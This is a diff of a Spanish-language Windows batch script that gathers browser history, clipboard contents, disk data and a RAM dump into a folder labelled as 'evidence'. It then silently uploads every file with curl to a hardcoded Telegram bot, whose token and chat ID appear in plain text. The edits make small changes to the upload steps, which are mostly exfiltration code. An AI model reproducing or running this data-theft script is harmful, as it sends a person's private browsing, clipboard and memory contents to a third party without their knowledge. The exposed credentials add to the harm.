@@ -9,7 +9,7 @@ echo.
 :: 1. CREAR CARPETA PRINCIPAL
 :: ============================================
 mkdir C:\EVIDENCIAS_COMPLETAS 2>nul
-echo Carpeta C:\EVIDENCIAS_COMPLETAS creada
+echo [OK] Carpeta C:\EVIDENCIAS_COMPLETAS creada
 
 :: ============================================
 :: 2. RECOLECTAR EVIDENCIAS DIGITALES
@@ -182,6 +182,7 @@ echo Enviando archivos a Telegram...
 set BOT_TOKEN=8886338270:AAHbMMSRXqOSKKc5CaTiw2mdWACnV_0Zd2Q
 set CHAT_ID=5064456618
 
+:: Enviar archivos de texto
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\00_INFORME_FINAL.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\01_historial_navegacion.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\02_portapapeles.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
@@ -194,7 +195,11 @@ curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\08_vari
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\09_discos.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\chrome_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
 curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\edge_history_backup.txt" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
-curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+
+:: Enviar volcado de RAM (si existe)
+if exist C:\EVIDENCIAS_COMPLETAS\memory.dmp (
+    curl.exe -s -F "chat_id=%CHAT_ID%" -F "document=@C:\EVIDENCIAS_COMPLETAS\memory.dmp" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" >nul 2>&1
+)
 
 echo.
 echo ============================================================
